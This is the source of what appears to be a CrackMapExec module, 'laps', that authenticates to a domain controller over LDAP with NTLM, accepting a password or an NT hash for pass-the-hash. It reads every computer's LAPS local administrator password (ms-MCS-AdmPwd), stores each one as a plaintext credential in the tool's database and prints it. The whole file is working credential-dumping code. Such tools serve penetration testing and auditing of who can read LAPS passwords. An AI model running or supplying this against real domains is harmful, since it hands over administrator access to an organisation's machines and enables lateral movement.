from ldap3 import ALL, Server, Connection, NTLM, extend, SUBTREE
import argparse
import os



class CMEModule:
    '''
      Module by technobro

      Grazie: per CME 

      
      byt3bl33d3r
      @snowscan
      @HackAndDo

      Credit:
      @n00py1
      Credit Reference: https://www.n00py.io/2020/12/dumping-laps-passwords-from-linux/
      Credit https://github.com/n00py/LAPSDumper
      
      
    '''

    name = 'laps'
    description = 'Retrieves the LAPS passwords. Make sure to point to the DC and specify the full domain name'
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = False



    def options(self, context, module_options):
        '''Required. Module options get parsed here. Additionally, put the modules usage here as well'''
        pass

    def base_creator(self, domain_name): 
        search_base = ""
        base = domain_name.split(".")
        for b in base:
            search_base += "DC=" + b + ","
        return search_base[:-1]
        '''Gives the LDAP base = ex: DC=contoso,DC=com'''




    def on_login(self, context, connection):
        '''Concurrent. Required if on_admin_login is not present. This gets called on each authenticated connection'''

        domain_name = connection.domain
        username = connection.username
        password = getattr(connection, "password", "")
        lmhash = getattr(connection, "lmhash", "")
        nthash = getattr(connection, "nthash", "")
        host = connection.host
        
        context.log.info('Getting LAPS Passwords')
        context.log.info('Make sure to point to the DC and specify the full domain name')
        context.log.info('Be careful the rid 500 might not be Administrator')


        s = Server(host, get_info=ALL)


        if not nthash:
            c = Connection(s, user=domain_name + "\\" + username, password=password, authentication=NTLM, auto_bind=True)
            c.search(search_base=self.base_creator(domain_name), search_filter='(&(objectCategory=computer)(ms-MCS-AdmPwd=*))',attributes=['ms-MCS-AdmPwd','SAMAccountname'])
        

        else:
            c = Connection(s, user=domain_name + "\\" + username, password="aad3b435b51404eeaad3b435b51404ee:"+nthash, authentication=NTLM, auto_bind=True)
            c.search(search_base=self.base_creator(domain_name), search_filter='(&(objectCategory=computer)(ms-MCS-AdmPwd=*))',attributes=['ms-MCS-AdmPwd','SAMAccountname'])



        # for entry in c.entries:
        #     #print (str(entry['sAMAccountName']) +":"+ str(entry['ms-Mcs-AdmPwd']))

        #     output = (str(entry['sAMAccountName']) +":"+ str(entry['ms-Mcs-AdmPwd']))
        
        #     context.log.highlight(output)


        # for entry in c.entries:
        #     context.db.add_credential("plaintext",connection.domain, str(entry['sAMAccountName']), str(entry['ms-Mcs-AdmPwd']))

        #     context.log.highlight("%s\\%s %s" % (entry['sAMAccountName'], "Administrator", entry['ms-Mcs-AdmPwd']))


        for entry in c.entries:
            context.db.add_credential("plaintext", str(entry['sAMAccountName']).rstrip('$'), "Administrator", str(entry['ms-Mcs-AdmPwd']))

            context.log.highlight("%s\\%s %s" % (entry['sAMAccountName'], "Administrator", entry['ms-Mcs-AdmPwd']))


